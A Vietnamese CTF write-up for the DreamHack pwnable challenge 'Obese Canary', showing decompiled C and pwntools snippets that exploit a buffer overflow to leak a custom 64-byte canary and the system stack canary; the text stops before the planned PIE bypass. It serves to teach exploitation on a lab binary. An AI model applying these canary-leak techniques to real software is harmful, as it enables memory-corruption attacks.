# Obese-Canary---DreamHack
Hướng dẫn cách giải bài Obese Canary cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma
**Category:** Binary Exploitation
**Date:** 29/11/2025

## 1. Mục tiêu cần làm
- Tìm ra được canary của bài
- Tìm được canary của system
- Vượt qua ngẫu nhiên hóa địa chỉ ( PIE )
- Chiếm quyền điều khiển và thực thi hàm

## 2. Cách làm
Đầu tiên chúng ta cần phải xem bài này có các lớp bảo mật gì.

<img width="1195" height="228" alt="image" src="https://github.com/user-attachments/assets/dd422461-55c1-4172-bd67-1458e438d679" />

Như các bạn thấy thì nó có PIE và Canary ( như mục tiêu ban đầu của chúng ta ). Giờ thì hãy bắt tay vào việc đầu tiên đó là tìm ra được Canary của bài ( nó khá là béo tận 64 byte ).

Khi các bạn chạy chương trình nó có 3 mục như sau :

<img width="875" height="126" alt="image" src="https://github.com/user-attachments/assets/2128d156-6905-4047-91b4-a2eea6b74691" />

1. Là in ra biến buf mà bạn sẽ nhập. Đây sẽ là mục tiêu khai thác chính của chúng ta.
2. Là để chạy hàm read của chương trình, nhằm mục đích nhận các byte mà bạn đã nhập vào buf.
3. Thoát vòng lặp và chương trình. Sẽ là bước cuối để chúng ta chiếm quyền điều khiển.

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-68h] BYREF
  int i; // [rsp+Ch] [rbp-64h]
  __int64 buf[2]; // [rsp+10h] [rbp-60h] BYREF
  __int64 v7[10]; // [rsp+20h] [rbp-50h] BYREF

  v7[9] = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  buf[0] = 0LL;
  buf[1] = 0LL;
  memset(v7, 0, 64);
  sub_1493(v7);
  puts("My canary is obese...Can you examine my bird and resolve the main cause?");
  while ( 1 )
  {
    sub_1542();
    __isoc99_scanf("%d", &v4);
    if ( v4 == 3 )
      break;
    if ( v4 > 3 )
      goto LABEL_15;
    if ( v4 == 1 )
    {
      puts("--------------------");
      printf("X-Ray result : %s\n", (const char *)buf);
      puts("--------------------");
    }
    else if ( v4 == 2 )
    {
      printf("Input operation : ");
      read(0, buf, 0x100uLL);
    }
    else
    {
LABEL_15:
      puts("Invalid input! Try again.");
    }
  }
  puts("Let's check the canary.");
  for ( i = 0; i <= 63; ++i )
  {
    if ( *((_BYTE *)v7 + i) != my_canary[i] )
    {
      puts("Oh no!!! My canary is injured during operation!!!");
      exit(1);
    }
  }
  puts("Good. Now my canary, fly!");
  return 0;
}
```
Như các bạn thấy thì khi chạy chương trình chúng ta sẽ bị mắc kẹt trong 1 vòng lặp cho đến khi nhập số 3. Đây sẽ là lỗ hổng để khai thác hết tất cả nhưng mục tiêu chúng ta cần.

Đầu tiên hãy tìm ra Canary của bài trước. Các bạn thấy biến buf được khai báo trước biến v7 và `read(0, buf, 0x100uLL);` nó nhận tận 256 byte trong khi đó biến buf chỉ có 16 byte thôi. Đây là cơ sở để chúng ta thai khác Buffer Overflow.

Làm sao chúng ta biết Canary của bài sẽ được nhập vào đâu ? `sub_1493(v7);` Đọc lệnh này thì các bạn sẽ nhận ra Canary bài sẽ được nhập vào biến v7 cũng là biến sẽ bị tràn khi ghi quá nhiều vào buf.

Để ra được Canary của bài thì chúng ta sẽ nhập 16 byte vào biến buf để nó in ra được Canary của bài. Tại sao lại là 16 byte ? `buf[0] = 0LL; buf[1] = 0LL` Thì khi các bạn nhập vào 16 byte nó sẽ đè mất 2 cái null này. Mà hàm print trong C thì nếu các bạn không ghi giới hạn thì nó sẽ in cho đến khi gặp null là dừng. Vậy nên khi các bạn ghi đè null của buf nó sẽ *vô tình* in ra Canary của bài luôn.

```Python
# --- 1. LEAK CANARY ---
p.sendlineafter(b'> ', b'2')
p.sendafter(b'Input operation : ', b'A'*16)

p.sendlineafter(b'> ', b'1')
p.recvuntil(b'A'*16)
canary = p.recv(64)
log.info(f"Canary hex: {canary.hex()}")
```
Xong bước đầu giờ hãy sang bước tiếp theo là tìm Canary của hệ thống, mình sẽ gọi nó là Canary system.

Thường Canary system nằm ở địa chỉ rbp-0x8, nên chúng ta có thể tính khoảng cách của nó bằng việc rbp-0x60 - rbp-0x8 ( địa chỉ buf ) <=> 96 - 8 = 88 byte. Vậy offset từ buf đến Canary system là 88 byte. Nhưng Canary system luôn luôn bắt đầu bằng null và như mình nói hàm print của C, vậy nên các bạn cần nhập vào 89 byte để ghi đè byte null của Canary system.

```Python
payload_leak_sys = b'A' * 89
p.sendlineafter(b'>', b'2')
p.sendafter(b'operation :', payload_leak_sys)

p.sendlineafter(b'> ', b'1')
p.recvuntil(b'X-Ray result : ')
p.recv(89)

sys_canary_raw = p.recv(7)
sys_canary = b'\x00' + sys_canary_raw
log.success(f"System Canary: {sys_canary.hex()}")
```
Vậy là chúng ta đã có Canary system rồi. Hãy sang bước 3 là vượt qua địa chỉ ngẫu nhiên của PIE.





